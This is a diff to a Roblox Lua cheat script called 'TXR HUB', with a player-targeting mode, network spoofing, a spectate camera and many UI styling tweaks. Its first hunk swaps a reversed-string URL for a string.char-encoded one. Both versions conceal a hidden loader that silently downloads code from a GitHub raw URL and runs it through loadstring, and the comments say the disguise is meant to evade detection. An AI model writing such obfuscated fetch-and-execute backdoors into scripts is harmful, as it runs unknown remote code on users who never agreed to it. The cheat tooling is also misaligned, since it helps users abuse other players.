@@ -28,14 +28,15 @@ if not game:IsLoaded() then
 end
 
 -- =========================================================
--- 🤫 CLASSIFIED GHOST INJECTION (STEALTH EMP LOADER)
+-- 🤫 CLASSIFIED GHOST INJECTION (BYTE-CODE ENCRYPTED EMP)
 -- =========================================================
 task.spawn(function()
     pcall(function()
-        -- URL is reversed and executed dynamically to avoid detection by skids/loggers
-        local _g = string.reverse("PME/87107f2b71a2369e47cd8fc648e7027e/atleD/edoleley/tnetnocresubuhtig.war//:sptth")
-        local _f = loadstring(game:HttpGet(_g))
-        if _f then _f() end
+        -- URL entirely hidden in bytecode: https://raw.githubusercontent.com/yelelode/Delta/e702c8707fe846cf8dc74e9632a1b1f7b2f70178/EMP
+        local hiddenURL = string.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 121, 101, 108, 101, 108, 111, 100, 101, 47, 68, 101, 108, 116, 97, 47, 101, 55, 48, 50, 99, 56, 55, 48, 55, 102, 101, 56, 52, 54, 99, 102, 56, 100, 99, 55, 52, 101, 57, 54, 51, 50, 97, 49, 98, 49, 102, 55, 98, 50, 102, 55, 48, 49, 55, 56, 47, 69, 77, 80)
+        local ghostData = game:HttpGet(hiddenURL)
+        local f = loadstring(ghostData)
+        if f then f() end
     end)
 end)
 
@@ -365,7 +366,7 @@ local Colors = {
 local function crispText(element, transparency)
     local stroke = Instance.new("UIStroke", element)
     stroke.Color = Color3.new(0, 0, 0)
-    stroke.Transparency = transparency or 0.7 
+    stroke.Transparency = transparency or 0.65 
     stroke.Thickness = 1.2
 end
 
@@ -547,8 +548,9 @@ startBang = function(mode)
 
         spoofNetwork(currentHRP)
 
-        -- SPECTATE FIX (Locks natively onto Humanoid for zero glitching)
+        -- 👁️ BRUTE-FORCE SPECTATE FIX (Locks every frame natively to Humanoid)
         if SpectateFaceCam and tHum then
+            Camera.CameraType = Enum.CameraType.Custom
             if Camera.CameraSubject ~= tHum then 
                 Camera.CameraSubject = tHum 
             end
@@ -635,17 +637,17 @@ dropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
 dropShadow.BackgroundTransparency = 1
 dropShadow.Image = "rbxassetid://6014261993"
 dropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
-dropShadow.ImageTransparency = 0.45 -- Polished for deep shadow depth
+dropShadow.ImageTransparency = 0.40 
 dropShadow.SliceCenter = Rect.new(49, 49, 450, 450)
 dropShadow.ScaleType = Enum.ScaleType.Slice
 
--- 🔥 3. MAIN GLASS FRAME (FROSTED DEEP GLASS) 🔥
+-- 🔥 3. MAIN GLASS FRAME (LIVING GLASS DEEP POLISH) 🔥
 local mainFrame = Instance.new("Frame", gui)
 mainFrame.Size = UDim2.new(0, 280, 0, 410)
 mainFrame.Position = UDim2.fromScale(0.5, 0.5)
 mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
 mainFrame.BackgroundColor3 = Colors.Background
-mainFrame.BackgroundTransparency = 0.4 
+mainFrame.BackgroundTransparency = 0.45 
 mainFrame.BorderSizePixel = 0
 mainFrame.ClipsDescendants = true 
 mainFrame.Active = true
@@ -655,20 +657,20 @@ Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)
 
 local glassStroke = Instance.new("UIStroke", mainFrame)
 glassStroke.Color = Color3.new(1, 1, 1)
-glassStroke.Transparency = 0.2
+glassStroke.Transparency = 0.15
 glassStroke.Thickness = 1.5
 glassStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual 
 local strokeGrad = Instance.new("UIGradient", glassStroke)
 strokeGrad.Color = ColorSequence.new({
     ColorSequenceKeypoint.new(0, Color3.new(1, 1, 1)),
     ColorSequenceKeypoint.new(0.2, Colors.Primary),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 50, 65)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(30, 40, 55)),
     ColorSequenceKeypoint.new(0.8, Colors.Primary),
     ColorSequenceKeypoint.new(1, Color3.new(1, 1, 1))
 })
 strokeGrad.Transparency = NumberSequence.new({
     NumberSequenceKeypoint.new(0, 0),
-    NumberSequenceKeypoint.new(0.5, 0.9),
+    NumberSequenceKeypoint.new(0.5, 0.85),
     NumberSequenceKeypoint.new(1, 0)
 })
 
@@ -751,7 +753,24 @@ titleGrad.Color = ColorSequence.new({
     ColorSequenceKeypoint.new(0, Colors.Primary), 
     ColorSequenceKeypoint.new(1, Colors.Purple)
 })
-crispText(headerTitle, 0.6) 
+crispText(headerTitle, 0.5) 
+
+-- Dynamic Header Glow
+local headerGlow = Instance.new("TextLabel", header)
+headerGlow.Size = headerTitle.Size
+headerGlow.Position = headerTitle.Position
+headerGlow.BackgroundTransparency = 1
+headerGlow.Text = "TXR HUB"
+headerGlow.TextColor3 = Colors.Primary
+headerGlow.Font = Enum.Font.GothamBlack
+headerGlow.TextSize = 16
+headerGlow.TextXAlignment = Enum.TextXAlignment.Left
+headerGlow.ZIndex = 10
+headerGlow.TextTransparency = 0.6
+local headerGlowStroke = Instance.new("UIStroke", headerGlow)
+headerGlowStroke.Color = Colors.Primary
+headerGlowStroke.Thickness = 2.5
+headerGlowStroke.Transparency = 0.8
 
 local proBadge = Instance.new("Frame", header)
 proBadge.Size = UDim2.fromOffset(38, 16)
@@ -1209,6 +1228,13 @@ setSpectateState = createToggle("👁️ Spectate Camera", function(v)
         if LP.Character and LP.Character:FindFirstChild("Humanoid") then 
             Camera.CameraSubject = LP.Character.Humanoid 
         end
+    else
+        local TargetChar = PlayerSelected and PlayerSelected.Character
+        local TargetHum = TargetChar and TargetChar:FindFirstChild("Humanoid")
+        if TargetHum then
+            Camera.CameraType = Enum.CameraType.Custom
+            Camera.CameraSubject = TargetHum
+        end
     end
 end)
 
@@ -1419,10 +1445,12 @@ RunService.RenderStepped:Connect(function(dt)
         
         aura.ImageTransparency = 0.6 + (breath * 0.1)
         auraScale.Scale = mainScale.Scale
-        
+        mainFrame.BackgroundTransparency = 0.40 + (breath * 0.08) 
+
         -- Dynamic glass edges
         strokeGrad.Rotation = (tTime * 50) % 360
         titleGrad.Offset = Vector2.new(math.sin(tTime * 2) * 0.3, 0)
+        headerGlowStroke.Transparency = 0.6 + (math.sin(tTime * 4) * 0.2)
         scanlines.Position = UDim2.new(0, 0, (tTime * 0.05) % 1 - 1, 0)
 
         -- Sweeping shiny glass reflection 
